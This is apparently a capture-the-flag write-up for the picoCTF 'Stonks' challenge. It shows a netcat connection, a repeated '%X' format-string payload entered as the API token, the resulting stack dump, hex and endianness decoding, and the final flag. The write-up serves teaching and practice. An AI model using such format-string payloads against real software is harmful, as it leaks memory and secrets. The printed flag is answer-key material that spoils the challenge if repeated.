# Stonks

## Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 59616

## Solution

connect netcat
```
$ nc mercury.picoctf.net 59616
```

Use the string '%x' to exploit a format string vulnerability to print values ​​from the stack in hexadecimal format.
```
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X
Buying stonks with token:
8B7D410804B00080489C3F7F43D80FFFFFFFF18B7B160F7F51110F7F43DC708B7C18028B7D3F08B7D4106F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E3834313634356562FFC3007DF7F7EAF8F7F51440CD6EF40010F7DE0CE9F7F520C0F7F435C0F7F43000FFC347D8F7DD168DF7F435C08048ECAFFC347E40F7F65F09804B000F7F43000F7F43E20FFC34818F7F6BD50F7F44890CD6EF400F7F43000804B000FFC348188048C868B7B160FFC34804FFC34818
Portfolio as of Sun Mar  2 03:43:55 UTC 2025
```

In this case, %X%X%X... is used to read data from the stack and see if there is any sensitive information that can be exposed, such as memory addresses, hidden variables, or even flags.

After that, decode from hex to text.

![stonk1](https://i.imgur.com/wa7LvQH.png)

We got the flag but it's still in the wrong format, so try to decode it again from hex to text.

![stonk2](https://i.imgur.com/UgrsheD.png)

Do the decode again, use cyberchef with recipe **swap endianness** and **from hex**

![stonk3](https://i.imgur.com/NUQAiNL.png)

## Flag
    picoCTF{I_l05t_4ll_my_m0n3y_6148be54}